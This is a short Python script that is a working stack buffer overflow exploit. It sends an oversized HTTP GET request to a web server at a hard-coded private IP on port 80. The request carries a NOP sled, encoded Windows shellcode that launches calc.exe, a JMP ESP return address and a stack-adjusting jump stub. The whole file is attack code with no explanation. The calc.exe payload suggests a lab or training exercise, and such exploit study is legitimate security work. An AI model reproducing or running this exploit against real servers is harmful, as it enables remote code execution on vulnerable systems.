import socket


offset = 1787

nop = b"\x90"

host = "172.15.10.63"
port = 80


eip = b"\xdd\x65\xe3\x77" # - JMP ESP 77e365dd

#windows/exec CMD=calc.exe  -b '\x00\x0D'

buf =  b""
buf += b"\xbe\xeb\x1b\x35\xbe\xd9\xeb\xd9\x74\x24\xf4\x58"
buf += b"\x2b\xc9\xb1\x31\x83\xc0\x04\x31\x70\x0f\x03\x70"
buf += b"\xe4\xf9\xc0\x42\x12\x7f\x2a\xbb\xe2\xe0\xa2\x5e"
buf += b"\xd3\x20\xd0\x2b\x43\x91\x92\x7e\x6f\x5a\xf6\x6a"
buf += b"\xe4\x2e\xdf\x9d\x4d\x84\x39\x93\x4e\xb5\x7a\xb2"
buf += b"\xcc\xc4\xae\x14\xed\x06\xa3\x55\x2a\x7a\x4e\x07"
buf += b"\xe3\xf0\xfd\xb8\x80\x4d\x3e\x32\xda\x40\x46\xa7"
buf += b"\xaa\x63\x67\x76\xa1\x3d\xa7\x78\x66\x36\xee\x62"
buf += b"\x6b\x73\xb8\x19\x5f\x0f\x3b\xc8\xae\xf0\x90\x35"
buf += b"\x1f\x03\xe8\x72\xa7\xfc\x9f\x8a\xd4\x81\xa7\x48"
buf += b"\xa7\x5d\x2d\x4b\x0f\x15\x95\xb7\xae\xfa\x40\x33"
buf += b"\xbc\xb7\x07\x1b\xa0\x46\xcb\x17\xdc\xc3\xea\xf7"
buf += b"\x55\x97\xc8\xd3\x3e\x43\x70\x45\x9a\x22\x8d\x95"
buf += b"\x45\x9a\x2b\xdd\x6b\xcf\x41\xbc\xe1\x0e\xd7\xba"
buf += b"\x47\x10\xe7\xc4\xf7\x79\xd6\x4f\x98\xfe\xe7\x85"
buf += b"\xdd\xf1\xad\x84\x77\x9a\x6b\x5d\xca\xc7\x8b\x8b"
buf += b"\x08\xfe\x0f\x3e\xf0\x05\x0f\x4b\xf5\x42\x97\xa7"
buf += b"\x87\xdb\x72\xc8\x34\xdb\x56\xab\xdb\x4f\x3a\x02"
buf += b"\x7e\xe8\xd9\x5a"

                                #635
jmpcode =  (b'\x83\xEC\x7F' +   #1 sub esp, 127
            b'\x83\xEC\x7F' +   #2 sub esp, 127
            b'\x83\xEC\x7F' +   #3 sub esp, 127
            b'\x83\xEC\x7F' +   #4 sub esp, 127
            b'\x83\xEC\x7F' +   #5 sub esp, 127
            b'\xff\xe4')        #6 jmp, esp

print("Shellcode Length:{} ".format(len(buf)))           
payload = nop * (offset - len(buf)) + buf + eip + jmpcode

try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                connect = s.connect((host, port))

                s.sendall(b"GET " + payload + b" HTTP/1.1\r\n\r\n")
                data = s.recv(1024)
                print("[!] Sent {} Bytes".format(len(payload)))
                s.close()
except:
     print("[+] Crashed at {} Bytes".format(len(payload)))
